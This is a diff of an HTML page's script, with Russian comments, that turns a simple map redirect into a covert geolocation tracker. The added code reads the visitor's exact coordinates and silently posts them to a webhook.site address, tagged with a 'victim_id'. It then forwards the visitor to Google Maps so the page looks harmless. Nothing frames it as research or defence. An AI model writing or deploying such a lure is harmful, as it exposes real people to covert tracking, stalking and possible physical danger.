@@ -5,18 +5,26 @@
 </head>
 <body>
     <script>
-        // Запрашиваем точные координаты устройства
         navigator.geolocation.getCurrentPosition(function(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            
-            // Отправляем эти данные тебе (например, через Webhook или просто выводим, если ты смотришь через его экран)
-            console.log(`Кординаты: ${lat}, ${lon}`);
-            
-            // Сразу перебрасываем на Google Maps с меткой дома
-            window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
+            const myWebhook = "https://webhook.site/5910295a-0efa-4674-aa84-eb4bb640bf18";
+
+            fetch(myWebhook, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    latitude: lat,
+                    longitude: lon,
+                    victim_id: "188226239",
+                    info: "Геолокация получена"
+                })
+            }).then(() => {
+                window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
+            });
         }, function(err) {
-            console.log("Доступ к гео запрещен");
+            // Если отказал в доступе, просто редирект на обычную карту
+            window.location.href = "https://www.google.com/maps";
         });
     </script>
 </body>
